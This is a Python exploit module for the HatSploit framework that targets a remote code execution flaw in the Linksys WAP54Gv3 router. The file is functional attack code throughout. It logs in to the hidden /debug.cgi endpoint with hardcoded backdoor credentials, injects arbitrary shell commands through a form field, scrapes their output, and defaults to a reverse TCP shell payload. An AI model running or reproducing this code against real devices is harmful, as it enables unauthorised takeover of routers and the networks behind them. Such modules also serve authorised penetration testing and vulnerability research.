"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP


class HatSploitModule(Module, Handler, HTTP):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "Linksys WAP54Gv3 debug Remote Code Execution",
            'Module': "exploit/linux/linksys/wap54gv3_debug_rce",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Phil Purviance - vulnerability researcher',
            ],
            'Description': "Remote Code Execution in Linksys WAP54Gv3.",
            'Platform': OS_LINUX,
            'Rank': "high",
            'Payload': {
                'Value': "linux/mipsle/shell_reverse_tcp",
                'Arches': [ARCH_MIPSLE, ARCH_MIPSBE, ARCH_GENERIC],
                'Platforms': [OS_LINUX, OS_UNIX],
            }
        })

    def exploit(self, command):
        response = self.http_request(
            method="POST",
            path='/debug.cgi',
            data={"data1": command, "command": "ui_debug"},
            auth=("Gemtek", "gemtekswd"),
        )

        output = re.findall(
            '<textarea rows=30 cols=100>(.+?)</textarea>', response.text, re.DOTALL
        )

        if len(output):
            return output[0]

    def check(self):
        response = self.http_request(
            method="GET",
            path="/debug.cgi",
            auth=("Gemtek", "gemtekswd"),
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        self.module_handle(
            method="echo",
            sender=self.exploit,
        )
